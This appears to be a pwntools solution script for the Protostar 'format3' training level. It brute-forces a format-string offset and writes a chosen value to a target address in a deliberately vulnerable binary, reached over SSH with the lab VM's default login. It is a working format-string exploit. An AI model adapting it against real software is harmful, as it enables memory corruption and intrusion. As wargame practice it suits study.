#!/usr/bin/env python3
from pwn import *
context.update(arch='i386', os='linux')
context.bits =32
exe = '/opt/protostar/bin/format3'


def getOffset():
    egg = 'AAAA'
    offset = 1
    while offset < 6000:
        context.log_level = 'error'
        c = int(offset)
        payload = egg + '%p'*c+'%p'
        sh = s.run(exe)
        sh.sendline(payload)
        result = sh.recvS()
        if '41414141' in result:
            context.log_level = 'info'
            log.info(payload)
            log.success('offset={}, result={}'.format(offset, result))
            context.log_level = 'error'
            break
        offset += 1

'''
user@protostar:/opt/protostar/bin$ objdump -t ./format2 | grep target
080496e4 g     O .bss   00000004              target
'''
def findOffsetAndBytesWritten(lower=0, upper=8):
    foundRes = False
    b = log.progress("bytesWritten")
    o = log.progress("offset")
    context.log_level = 'error'
    result = ''
    dst = 0x080496f4
    val = 0x01025544
    bingo = 'you have modified'

    s = ssh(host='192.168.12.128', user='user', password='user')
    for bytesWritten in range(lower, upper):
        for offset in range(lower, upper):
            payload = fmtstr_payload(offset, {dst: val}, write_size='byte', numbwritten=bytesWritten)
            context.log_level = 'info'
            b.status(str(bytesWritten))
            o.status(str(offset))
            context.log_level = 'error'
            sh = s.run(exe)
            sh.sendline(payload)
            result = sh.recvS()
            if bingo in result:
                context.log_level = 'info'
                log.info(payload)
                log.success('offset={}, bytesWritten={}, result={}'.format(offset, bytesWritten, result))
                context.log_level = 'error'
                s.close()
                return offset, bytesWritten
    s.close()

def exploit(offset, bytesWritten):
    context.log_level = 'info'
    log.info('Executing exploit')
    dst = 0x080496f4
    val = 0x01025544
    s = ssh(host='192.168.12.128', user='user', password='user')
    payload = fmtstr_payload(offset, {dst: val}, write_size='byte', numbwritten=bytesWritten)
    sh = s.run(exe)
    log.info(payload)
    sh.sendline(payload)
    result = sh.recvS()
    print(result)
    s.close()

offset = 12
bytesWritten = 0
exploit(offset, bytesWritten)
